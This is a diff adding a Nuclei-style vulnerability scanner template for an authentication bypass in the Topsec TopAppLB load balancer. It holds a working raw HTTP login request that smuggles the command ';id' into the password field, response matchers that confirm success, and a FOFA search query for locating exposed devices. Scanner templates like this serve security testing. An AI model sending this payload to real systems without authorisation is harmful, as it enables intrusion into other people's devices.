@@ -1,0 +1,37 @@
+id: topsec-topapplb-auth-bypass
+
+info:
+  name: Topsec TopAppLB - Authentication Bypass
+  author: SleepingBag945
+  severity: high
+  description: |
+    Topsec TopAppLB is vulnerable to authetication bypass .Enter any account on the login page, the password is `;id`.
+  reference:
+    - https://github.com/cqr-cryeye-forks/goby-pocs/blob/main/Topsec-TopAppLB-Any-account-Login.json
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: title="TopApp-LB 负载均衡系统"
+  tags: topsec,topapplb,auth-bypass
+
+http:
+  - raw:
+      - |
+        POST /login_check.php  HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=admin&password=%3Bid
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 302 && status_code_2 == 200'
+          - 'contains(body_2,"var IsHeadMin ")'
+          - 'contains(header_1,"redirect.php") && !contains(tolower(header_1), "error=1")'
+        condition: and
+
+# digest: 4b0a00483046022100e8f44d9990db2387a73ae9797f68b7ae5979aeee4c2b7ece9e389bf4bcd17321022100e4fa7bfe663a13d29c25eced27b5aaf6f66f8e1d78a56c430cdf479cf3b0d365:922c64590222798bb761d5b6d8e72950
